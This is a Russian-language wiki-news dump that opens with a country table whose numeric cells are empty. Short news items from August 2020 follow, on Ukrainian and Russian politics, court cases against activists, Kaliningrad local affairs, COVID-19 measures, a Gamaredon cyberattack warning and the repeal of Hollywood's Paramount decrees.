|style="text-align:right"| ||Кюрасао|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Фиджи|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сент-Люсия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Восточный Тимор|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гренада|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Новая Каледония|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Лаос|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Доминика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сент-Китс и Невис|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сен-Бартелеми (Карибы)|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гренландия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Монтсеррат|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Карибские Нидерланды|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Фолклендские острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ватикан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Британские Виргинские острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Западная Сахара|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||MS Zaandam || ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сен-Пьер и Микелон|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ангилья|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Китай|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|}
 
 
 
Источники
*

Кабинет министров провел кадровые перестановки в порту "Южный", назначив нового руководителя.
Как пишет RegioNews, об этом сообщил народный депутат Алексей Гончаренко в своем Telegram-канале.
Вместо Александра Олейника, который занимал должность исполняющего обязанности директора порта с ноября 2019, назначено Сергея Ковшару.
Ранее в структуре управления порта Ковшар занимал должность заместителя директора по экономике и финансам.
Напомним, в порту "Южный” "накрыли" партию кокаина стоимостью 90 млн грн.
 
Источники

В Верховной Раде депутаты создадут временную следственную комиссию по расследованию дела задержанных в Беларуси "вагнеровцев" и возможной государственной измены главы Офиса президента Андрея Ермака.
Об этом в Telegram сообщил народный депутат Алексей Гончаренко, передает RegioNews.
По словам народного депутата, процесс создания депутатской комиссии стартовал сегодня.
 
Гончаренко также направил в СБУ, ГБР и ГПУ обращение с требованием начать уголовное производство по факту срыва спецоперации по задержанию террористов.
Ранее СМИ писали, что это произошло по вине главы ОП Ермака, который уговорил президента отдать приказ остановить захват террористов и перенести операцию.
Напомним, украинский журналист Юрий Бутусов обвинил главу Офиса президента Андрея Ермака в государственной измене за срыв секретной операции украинских спецслужб.
Впоследствии, партия "Голос" потребовала проведения расследования возможной государственной измены в Офисе Президента.
По мнению советника главы Офиса президента Михаила Подоляка вся история с задержанием наемников ЧВК "Вагнер", арестованных в Беларуси, является "блестящей медийной операцией".
 
Источники

В первый балетный класс филиала Московской академии хореографии, который открылся в Калининграде, набрали 18 детей. Об этом сообщает пресс-служба регионального правительства.
Всего было подано 77 заявок. Конкурсный отбор прошли 13 девочек и пять мальчиков. Срок обучения — семь лет десять месяцев, оно проводится за счёт бюджета и интегрировано с общим и средним образованием. Воспитанников академии разместят в интернате
В связи со смещением сроков ввода в эксплуатацию культурно-образовательного комплекса на острове Октябрьский в Калининграде, руководством МГАХ и его филиала в Калининграде принято решение об обучении детей по программе среднего профессионального образования на площадке академии в Москве в 2020-2021 году", — добавили в пресс-службе.
Филиал Московской академии хореографии в Калининграде открылся в сентябре 2019 года.
 
Источники

Иностранным студентам разрешат прийти на учебу в российские вузы после 14-дневного карантина и сдачи тестов на новую коронавирусную инфекцию, сообщило Минобрнауки РФ. Ведомство назвало второе условие допуска иностранцев к учебе - граница их страны с Россией должна быть открыта.
Если международное сообщение с их государством будет по-прежнему ограничено, им придется учиться дистанционно до отмены этих ограничений. Вопросы въезда в Россию не входят в компетенцию министерства, пишет «Интерфакс».
Учебный год в вузах начнется 1 сентября.
МГУ объявил, что иностранные студенты начнут учиться 1 сентября дистанционно, а перейти на очное обучение они смогут после открытия границ.
По состоянию на 19 августа в России выявлено более 935 тысяч случаев коронавируса. Около 16,000 человек умерли от вируса.
 
Источники

В супермаркете "Дёшево" на улице Батальной покупательница нашла упаковку яиц, датированную 20-м августа. Как рассказала "Клопс" калининградка Дарья, в магазине она была во вторник, 18-го.
На коробке с надписью "Яйцо гурьевское" значилась дата сортировки. В пресс-службе агрохолдинга "ДолговГрупп" "Клопс" объяснили, что никогда не маркируют продукцию задним числом.
Это просто небольшой технический сбой при сортировке. Иногда такое происходит, по каждому случаю разбираемся отдельно", — пояснили в компании, добавив, что проверят поступившую информацию.
 
Источники

Госсекретарь США Майк Помпео опубликовал заявление по случаю Всемирного дня гуманитарной помощи, который отмечается 19 августа.
«Во Всемирный день гуманитарной помощи мы чтим память гуманитарных работников, которые пожертвовали собой, защищая жизни и облегчая страдания наиболее уязвимых людей мира, – заявил Помпео. – Мы признаем неустанную приверженность этих людей, которые ставят жизни выше собственных и продолжают свою спасительную работу, несмотря на растущие риски для собственного здоровья и безопасности. Они должны иметь возможность выполнять свою благородную работу в безопасности. Совершенно необходимо, чтобы все стороны в вооруженных конфликтах соблюдали свои обязательства по международному гуманитарному праву и работали над обеспечением безопасности и защиты гуманитарного персонала. Нападения, направленные на медицинских и других гуманитарных работников, подвергают риску миллионы людей, лишая их ухода и помощи, и эта тенденция ухудшается даже в условиях глобальной пандемии».
«Соединенные Штаты издавна лидируют в борьбе с международными гуманитарными кризисами, – напомнил Помпео. – В 2019 финансовом году США выделили 9,25 миллиарда долларов на финансирование продуктов питания, жилья, здравоохранения, образования, безопасной питьевой воды и санитарии в интересах десятков миллионов пострадавших от кризисов во всем мире, в том числе многочисленных людей, лишившихся крова в результате конфликтов. За последнее десятилетие США выделили более 70 миллиардов долларов гуманитарной помощи по всему миру. Мы неизменно являемся крупнейшим донором Управления Верховного комиссара ООН по делам беженцев, Международной организации по миграции, Управления ООН по координации гуманитарных вопросов, Мировой продовольственной программы, ЮНИСЕФ и Международного комитета Красного Креста, а также многих международных и местных неправительственных организаций».
«Эта помощь включает поддержку в обеспечении безопасности и защиты гуманитарных работников, которые мужественно заботятся о наиболее уязвимых людях в опасных ситуациях от Сирии до Венесуэлы, от Северо-Восточной Нигерии до Бирмы, включая вооруженные конфликты. Глубокая приверженность американского народа помощи нуждающимся выходит за рамки официальной помощи, предоставляемой правительством США. Она также проявляется в помощи, оказываемой частными лицами, гражданским обществом Америки и неправительственными организациями, включая религиозные организации, частный сектор и многочисленных американцев, посвятивших свою жизнь гуманитарной работе», – говорится в документе.
«В то время, как глобальные гуманитарные потребности продолжают расти, учитывая рекордное количество вынужденных переселенцев, а также глобальный кризис в сфере здравоохранения и экономики в связи с пандемией COVID-19, Соединенные Штаты будут продолжать служить двигателем скоординированного международного реагирования на кризисы и поощрять другие правительства вносить больший вклад, чтобы разделить глобальное бремя удовлетворения гуманитарных потребностей. Так, в ответ на пандемию COVID-19 руководство США оказало беспрецедентную поддержку наиболее уязвимым людям в существующих и назревающих кризисных ситуациях. Оказание этой помощи стало возможным благодаря самоотверженным гуманитарным работникам, которых мы чествуем сегодня, и их предшественникам, которые уже покинули нас», – подчеркивается в заявлении главы Госдепартамента.
 
Источники

Британская горнодобывающая компания Hochschild Mining представила финансовые результаты за первое полугодие, согласно которым прибыль компании существенно сократилась из-за остановок в производственной деятельности в связи с пандемией коронавируса. Так, прибыль до вычета налогов составила $6,5 млн по сравнению с прибылью в $29,5 млн годом ранее.
Тем временем, скорректированная прибыль до уплаты процентов, налогов и амортизации уменьшилась с $153,7 млн за аналогичный период прошлого года до $80,6 млн.
Согласно отчету компании, выручка в минувшем полугодии составила $232 млн против $354,5 млн за шесть месяцев 2019 года.
 
Источники

В школах калининградской области младшеклассников и льготников, которые учатся в первую смену, будут кормить горячим завтраком во вторую или третью перемену. Об этом сообщает пресс-служба регионального правительства в среду, 19 августа.
Те, у кого занятия проходят во вторую смену, получат обед. Для учащихся на дому предусмотрен сухой паёк. Кормить ребят будут раз в день, детей с ограниченными возможностями здоровья — два раза. Стоимость питания в среднем увеличилась на 10%: 69,45 руб. для 1-4 классов и 74,83 руб. для 5-11 классов.
Все поставщики питания и пищеблоки готовы к новым объёмам приготовления блюд и сейчас проходят согласование меню. В течение десяти оставшихся дней мы с представителями Роспотребнадзора будем инспектировать пищеблоки, оценивать готовность и вносить последние коррективы, чтобы с 1 сентября дети получали качественное горячее питание, не нарушая норм и правил", — рассказала министр образования региона Светлана Трусенёва.
Калининградская область получит более 160 млн рублей субсидий на питание для младших школьников.
 
Источники

Раменский городской суде отправил журналиста «Росдержавы» Яна Кателевского на 2 месяца в СИЗО в рамках дела о вымогательстве (п. «б» ч. 3 ст. 163 УК). Об этом сообщает участник ОВД-Инфо Николай Сизиков.
Суд полностью удовлетворил ходатайство следователя, который ссылался на то, что Кателевский может скрыться, помешать ходу следствия и оказать давление на свидетелей, а также обвиняется по тяжкому преступлению.
При этом 17 августа Люберецкий городской суд отпустил Кателевского под домашний арест по делу о порче имущества (ч. 2 ст. 167 УК), но через некоторое время после этого его задержали в зале суда и доставили в качестве подозреваемого для ознакомления с новым делом в Раменский отдел полиции.
Когда следователю указали на это обстоятельство адвокаты, он не смог предоставить постановление о приводе, в рамках которого подозреваемого задержали в здании люберецкого суда. Следователь утверждает, что Кателевского задержали уже в здании Раменского СУ СК. Место фактического задержания ему якобы неизвестно.
Перед началом заседания Кателевскому стало плохо. К суду прибыла скорая помощи, врачи решили госпитализировать журналиста в Раменскую Центральную районную больницу. Однако через некоторое время по неизвестными причинам журналиста увезли обратно в суд. Как сообщал свидетель, в машине скорой помощи врач спрашивал у полицейского: «Вы что мне угрожаете, молодой человек?».
Яну Кателевскому вменяют две уголовные статьи: по делу о вымогательстве (п. «б» ч. 3 ст. 163 УК) и о порче имущества из хулиганских побуждений (ч. 2 ст. 167 УК). Дело о вымогательстве возбудили по заявлению сотрудника ДПС: Кателевский вместе со своим коллегой Александром Дороговым якобы требовали 1,3 миллиона рублей у силовика. Обоих журналистов задержали в конце июля, при этом об уголовном деле против них сообщалось за месяц до этого.
Ян Кателевский — оппозиционный активист, блогер и журналист, который неоднократно сталкивался с различными формами давления из-за своей деятельности. Так, в 2017 году судья Ольга Голышева дважды арестовала его из-за попытки заснять территорию возле полицейского участка, которую, по мнению Кателевского, полицейские захватили незаконно.
 
Источники

В Киевской области правоохранители задержали злоумышленников, которые совершали незаконные сделки с земельными участками.
Об этом сообщает пресс служба ГБР , передает RegioNews.
Известно, что в преступную группу входили чиновники Держгеокадастру Киевской области, работник патрульной полиции Хмельницкой и другие лица.
 
По данным следствия, чиновники разрабатывали и согласовывали разрешительные документы на выделение участков людям, которые ранее уже получали землю с таким же целевым назначением.
 
Правоохранители сообщили о подозрении бывшему руководителю Держгеокадастру Киевской области и его заместителю в злоупотреблении властью или служебным положением, а полицейскому - в мошенничестве.
Напомним, в Закарпатской ОГА прошли обыски, правоохранители проверяют закупку некачественных защитных костюмов на 25 миллионов гривен.
 
Источники

Национальный координационный центр кибербезопасности при Совете национальной безопасности и обороны обнаружил признаки подготовки к масштабной кибератаке на органы государственной власти накануне Дня Независимости.
Отмечается, что активизировались группировки хакеров «Gamaredon», за которым стоят спецслужбы Российской Федерации. Они являются действующей стороной российско-украинской кибервойны.
 
Во время последних попыток атак хакеры использовали вредоносные вложения, которые имитируют документы Службы безопасности Украины.
 
Как отметили в СНБО, кибератаки направлен на дестабилизацию ситуации в Украине накануне Дня независимости и во время подготовки к очередным местным выборам.
 
 
 
Источники

Вахитовский районный суд Казани арестовал на семь суток гражданского активиста Андрея Бояршинова по статье о проведении несанкционированного публичного мероприятия (ч. 2 ст. 20.2 КоАП). Об этом он сообщил «МБХ медиа».
1 августа Бояршинов участвовал в одиночных пикетах в поддержку хабаровчан. «Одиночное пикетирование признали совокупностью актов пикетирования тремя людьми, которые были объединены общим умыслом, замыслом и дали семь суток», — рассказал активист о суде.
Ранее Андрею Бояршинову вменяли нарушение порядка проведения публичного мероприятия (ч. 5 ст. 20.2 КоАП), однако 7 августа полицейские оформили на него протокол по более тяжкой части той же статьи. Активист намерен обжаловать преследование в ЕСПЧ.
С 11 июля жители Хабаровского края проводят акции в поддержку экс-губернатора Сергея Фургала. В субботу 25 июля шествие в Хабаровске собрало, по разным подсчетам, от 20 до 90 тысяч участников.
Действующего на тот момент губернатора Хабаровского края Сергея Фургала 9 июля задержали сотрудники ФСБ по подозрению в причастности к ряду заказных убийств. Его доставили в Москву, где по решению Басманного районного суда Москвы поместили под стражу до 9 сентября. 16 июля Мосгорсуд отклонил апелляционную жалобу защиты Фургала и признал это решение законным. 20 июля президент Владимир Путин подписал указ об отставке Фургала с поста губернатора и назначил на этот пост временно исполняющим обязанности однопартийца Фургала по ЛДПР Михаила Дегтярева, передавала «Медиазона».
1 августа акции солидарности с протестующими Хабаровска прошли в десятках городов, в том числе в Москве, Петербурге, Новосибирске, Казани и множестве городов Сибири и Дальнего Востока. Всего, по данным ОВД-Инфо, задержали 70 человек в 14 городах. Мы вели онлайн, публиковали списки задержанных и текст по итогам акций.
 
Источники

Премьер-министр Австралии Скотт Моррисон отказался от своего раннего заявления об обязательной вакцинации в стране против коронавируса.
Австралийский лидер отметил, что не существует механизмов, которые обеспечили бы принцип обязательности для граждан Австралии, пишет CNBC.
«Мы не можем никого поймать и заставить сделать прививку», - заявил Моррисон.
Ранее премьер Австралии заявил, что планирует ввести в стране обязательную вакцинацию против коронавируса.
Согласно последним данным, в Австралии с начала пандемии выявлено 24 тысячи случаев заражения коронавирусом, умерли 450 человек. По всему миру инфекцию подхватили 22.1 миллиона человек, умерла 781 тысяча.
 
Источники

Вынужденные переселенцы из Донбасса и аннексированного Крыма получат доступ ко всем государственным электронным услугам, в том числе они смогут оформить справку переселенца онлайн.
Как передает RegioNews, об этом говорится в сообщении пресс-службы Министерства реинтеграции.
Совместно с Министерством цифровой трансформации ведомство утвердило план своего цифрового развития.
 
Когда именно будут внедрены такие электронные услуги, он не уточнил.
Ранее сообщалось, что Кабмин планирует выделить 5,6 миллиона гривен на жилье для переселенцев.
 
Источники

Председатель Херсонского облсовета Владислав Мангер на судебном заседании по делу Гандзюк сделал громкое заявление относительноэкс-главы СБУ области, генерала-майора СБУ Даниила Доценко.
Об этом пишет RegioNews со ссылкой на Мой Херсон .
 
По словам Владислава Мангера, это было преступное сообщество, которое состояло из граждан иностранных государств. Они были задержаны в сентябре 2017 года в селе Чернобаевка. Мангер отметил, что группировка была задержана после вмешательства нардепа прошлого созыва Николая Паламарчука.
 
Напомним, вчера Днепровский суд Киева начал слушать по существу дело об убийстве херсонской активистки Екатерины Гандзюк, в организации которого подозревают главу Херсонского областного совета Владислава Мангера и Алексея Левина.
 
Источники

Некоторые элементы Дома Советов восстановить невозможно, их необходимо будет перестроить. Об этом журналистам рассказал глава региона Антон Алиханов в среду, 19 августа.
Состояние Дома Советов плохое, критическое. Отдельные элементы восстановить невозможно. Мы исходим из того, что инвестор, который застраивает территорию вокруг, там почти пять гектаров, он реконструирует Дом Советов. Те части, которые нужно разобрать — разберёт и возведёт заново. Мне сейчас сложно сказать, но это будет серьёзная реконструкция, которая будет подразумевать серьёзный демонтаж и возведение заново. Но это будет происходить не за бюджетный счёт, а за счёт прибыли проекта".
 
Источники

В центре Черняховска открылся духовно-просветительский центр "Преображение". Церемония прошла в среду, 19 августа.
В здании разместят детские и взрослые студии, службы поддержки многодетных семей, военно-патриотические и технические клубы. В центре будут проводить экскурсионно-паломнические мероприятия.
Ранее здесь располагался Дома пионеров, закрытый в 1997 году. После объект не использовался и разрушался. В 2010 недвижимость передали Калининградской епархии, в 2018 — Черняховской. К тому моменту здание находилось в аварийном состоянии.
Чтобы провести ремонт, была подана заявка в Федеральное агентство по делам национальностей, занимающемуся этнокультурным развитием и созданием аналогичных центров в сотрудничестве с общинами и традиционными конфессиями. В мае 2019 года работы начались, капремонт закончился в декабре 2019 года.
 
Источники

Билборды экс-главы Кировоградской облгосадминистрации, народного депутата и руководителя областной организации партии «Оппозиционная платформа – За жизнь» Сергея Ларина облили красной краской.
Об этом повідомляє Гражданская сеть ОПОРА в Кировоградской области, передает RegioNews.
По данному факту правоохранители начали расследование.
 
Напомним, 16 августа в Днепре неизвестные разрисовали палатку ОПЗЖ с призывами к "днепровскому референдуму".
 
Источники

Индийский конгломерат Reliance Industries приобрел контрольный пакет акций аптечного онлайн-портала Netmeds примерно за 6,2 млрд рупий ($83,08 млн) наличными через несколько дней после того, как крупнейший в мире Интернет-ритейлер Amazon.com заявил, что запустит онлайн-аптеку в индийском городе Бенгалуру.
Стоит отметить, что Vitalic и ее дочерние компании, известные под общим названием Netmeds, были объединены в 2015 году. Netmeds - это лицензированный аптечный портал, который предлагает как безрецептурные, так и рецептурные лекарственные препараты, а также традиционные индийские фитопрепараты.
Сообщается, что инвестиции индийского конгломерата включают в себя 60%-ную долю в компании Vitalic Health, а также 100%-ную долю участия во всех ее дочерних предприятиях.
 
Источники

Сайт «Миротворец» внес журналиста, редактора и ведущего телепередачи «Наші гроші з Денисом Бігусом» в свою базу из-за сюжета о сыне экс-секретаря СНБО Игоря Гладковского и о хищениях в оборонной промышленности.
Об этом говорится в сообщении на сайте Миротворец, передает RegioNews.
 
Как пример такой деятельности Бигуса «Миротворец» привел сообщение корпорации «Богдан» о том, что 3 июля Подольский районный суд Киева признал ложным и таким, что нарушает личные неимущественные права Игоря Гладковского видеосюжет о хищениях в оборонной промышленности (т.наз. «дело Свинарчуков»).
Ранее стало известно, что «слуга народа» Бужанский попал в базу «Миротворца».
 
Источники

Кабинет Министров Украины на заседании одобрил проект постановления парламента, которым предлагается переименовать Ивано-Франковский район на Галицкий.
Об этом в Facebook сообщил представитель правительства в Раде Василий Мокан, передает RegioNews.
 
Он добавил, что в ближайшее время согласованный Правительством проект постановления будет внесен на рассмотрение парламента.
Это решение связано с новым территориальным делением Украины, согласно которому, в Ивано-Франковской области было образовано шесть районов - Ивано-Франковский, Калушский, Коломыйский, Косовский, Надвирнянский и Верховинский.
31 июля областной совет решил обратиться к председателю Верховной Рады и премьер-министру с просьбой переименовать Ивано-Франковский район.
Напомним, действующего мэра Ивано-Франковска на выборах готовы поддержать почти 90% горожан. По данным социологов, Руслан Марцинкив уверенно выигрывает выборы уже в первом туре.
 
Источники

Федеральный суд дал зелёный свет Министерству юстиции США, позволив отменить закон 71-летней давности, известный как «декрет Парамаунт». Он запрещал крупнейшим голливудским студиям приобретать и контролировать сети кинотеатров. Закон носит ярко выраженный антимонопольный характер.
Его отмена, как подчеркивает обозреватель Тед Джонсон на сайте Deadline, позволит студиям вновь устанавливать контроль над сетями кинотеатров, ныне переживающими тяжелые времена из-за пандемии коронавируса.
«...Суд находит, что отмена запрета соответствует интересам общества», – написала в своем постановлении судья Аналиса Торрес из федерального окружного суда Южного округа Нью-Йорка (SDNY).
Иных уж нет...
Отменяемые в течение ближайших двух лет ограничения касаются практики «блок-букинга», то есть приобретения кинотеатрами одной лицензии на целый пакет фильмов, а также практики обязательного коллективного лицензирования фильмов для всех кинотеатров, входящих в ту или иную сеть (circuit dealing).
Судья согласилась с мнением Министерства юстиции, что этот закон, ускоривший в 50-60-е годы прошлого века крах «золотой эры» Голливуда, сегодня во многом устарел.
«70 лет технологических инноваций, появление новых конкурентов и деловых моделей, и изменение запросов потребителей фундаментально повлияли на киноиндустрию», - говорится в постановлении судьи Торрес.
За эти десятилетия существенно изменился ландшафт американского кинобизнеса. Так, закон касается студий, которых в прежнем виде больше не существует, в первую очередь, «большой пятерки» Голливуда – студий-мейджоров Warner Bros., 20th Century Fox, Paramount, MGM и RKO Pictures.
Так, в 2018 году студия Warner Bros., входившая в конгломерат Time Warner, была приобретена коммуникационным гигантом AT&T и переименована в WarnerMedia.
Другая именитая студия, «20 век Фокс», теперь входит в медийную империю Walt Disney, а не менее известная студия «Парамаунт» стала подразделением ещё одной медийной империи - ViacomCBS.
Один из старожилов американского кинобизнеса, студия «Метро-Голдвин-Майер» (MGM) несколько раз меняла владельцев, пережила банкротство и сейчас фактически утратила свой прежний статус.
И, наконец, ещё один член «большой пятерки», студия RKO Pictures, блиставшая в 30-40-е годы, остановила производство ещё в 1957 году и была расформирована два года спустя.
Впрямую касался закон не только «большой пятерки», но и так называемой «малой тройки» - знаменитых киностудий Universal, Columbia и United Artists.
В момент принятия «декрета Парамаунт» в конце 40-х годов студии-мейджоры были вертикально интегрированы с национальными сетями кинотеатров. Об этом напоминает Эрик Гарднер в журнале Hollywood Reporter. В результате исторического постановления Верховного суда США от 1948 года по делу «США против “Парамаунт пикчерз”» студиям надлежало избавиться от владения кинотеатрами, и отныне их отношения с ними подчинялись детально расписанным правилам и ограничениям.
Новые игроки
Судья Торрес также согласилась с аргументом Министерства юстиции, что действующее антитрестовское законодательство будет продолжать служить эффективным фактором, сдерживающим попытки монополизации, и в условиях отмены «декрета Парамаунт».
Национальная ассоциация владельцев кинотеатров (НАТО) и влиятельная Гильдия режиссёров Америки (DGA) выступили против решения Министерства юстиции. Они полагают, что изменение структуры кинобизнеса в последние годы требует гораздо более жесткого антитрестовского надзора.
Эксперты отмечают, что пришедшие в кинопромышленность в последние годы лидеры новых технологий – Netflix, Amazon, Apple и другие – производят и дистрибутируют фильмы, не подчиняясь этому давнему закону.
Озабоченность этим решением выражают и представители артхаусных кинотеатров. Они опасаются прихода в кинотеатральный прокат независимого и зарубежного кино таких мощных игроков, как Amazon, которые могут подмять под себя и фактически уничтожить этот сложный и малодоходный сегмент проката.
Обозреватели отмечают, что пандемия коронавируса ускорила процесс реструктуризации кинопрокатного рынка, который радикально меняется в последние годы из-за прихода новых просмотровых форматов - онлайн-стриминга и мобильных носителей.
Про яйцо и курицу
«Многие из нас запомнят 2020 год как год, когда кинопрокатный бизнес постигли необратимые изменения», - пишет Джоди Саймон в адвокатском блоге Fox Rothschild и напоминает о недавнем важном и трудном соглашении между студией Universal Pictures и AMC, крупнейшей в мире киносетью. Речь идет о сокращении «прокатного окна» с трех месяцев до почти трех недель.
Таким образом, студия получает право продавать свои релизы для размещения на стриминговых сервисах, на сервисах «видео по заказу» (VOD) и в кабельных телесетях гораздо раньше, чем прежде. В качестве компенсации, сеть AMC будет получать небольшой процент с этих продаж, по сути, конкурентных.
Пустующим кинотеатрам, которым грозит банкротство, и такой паллиатив на руку. Как говорится, не до жиру...
